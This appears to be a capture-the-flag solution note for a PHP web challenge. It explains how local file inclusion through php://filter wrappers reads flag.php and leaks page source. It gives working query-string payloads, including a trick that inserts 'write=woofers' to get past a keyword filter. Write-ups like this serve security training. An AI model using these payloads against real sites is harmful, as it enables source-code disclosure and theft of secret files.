## Solution


Read flag.php using php filters and LFI. Can also leak the source code of the current page if they are stuck.

```?category=php://filter/convert.base64-encode/resource=index```
  
Trying to read the flag directly will fail, because the code does a basic check for presence of "woofers" / "index" / "meowers".

``` Won't work: ?category=php://filter/convert.base64-encode/resource=flag```

```Will work: ?category=php://filter/convert.base64-encode/write=woofers/resource=flag```
